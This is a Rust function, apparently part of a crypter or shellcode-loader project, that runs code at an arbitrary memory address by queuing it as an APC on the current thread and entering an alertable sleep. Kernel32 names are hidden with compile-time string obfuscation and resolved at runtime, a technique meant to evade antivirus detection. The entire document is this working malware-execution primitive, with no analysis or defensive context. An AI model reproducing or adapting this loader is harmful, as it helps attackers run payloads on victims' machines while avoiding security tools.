pub unsafe fn exec(p: usize) -> Result<(), String> {
    use crate::utils::{load_library, get_proc_address};
    use rustcrypt_ct_macros::{obf_lit_bytes, obf_lit};
    use std::mem::transmute;
    let kernel32 = load_library(obf_lit_bytes!(b"kernel32.dll\0").as_slice())?;
    let p_queue_apc = get_proc_address(kernel32, obf_lit_bytes!(b"QueueUserAPC\0").as_slice())?;
    let p_get_current_thread = get_proc_address(kernel32, obf_lit_bytes!(b"GetCurrentThread\0").as_slice())?;
    let p_sleep_ex = get_proc_address(kernel32, obf_lit_bytes!(b"SleepEx\0").as_slice())?;
    type QueueUserAPCFn = unsafe extern "system" fn(Option<unsafe extern "system" fn(usize)>, usize, usize) -> u32;
    type GetCurrentThreadFn = unsafe extern "system" fn() -> isize;
    type SleepExFn = unsafe extern "system" fn(u32, i32) -> u32;
    let queue_user_apc: QueueUserAPCFn = transmute(p_queue_apc);
    let get_current_thread: GetCurrentThreadFn = transmute(p_get_current_thread);
    let sleep_ex: SleepExFn = transmute(p_sleep_ex);
    let apc_fn: unsafe extern "system" fn(usize) = transmute(p);
    let thread = get_current_thread();
    let ret = queue_user_apc(Some(apc_fn), thread as usize, 0);
    if ret == 0 {
        return Err(obf_lit!("QueueUserAPC failed").to_string());
    }
    sleep_ex(u32::MAX, 1);
    Ok(())
}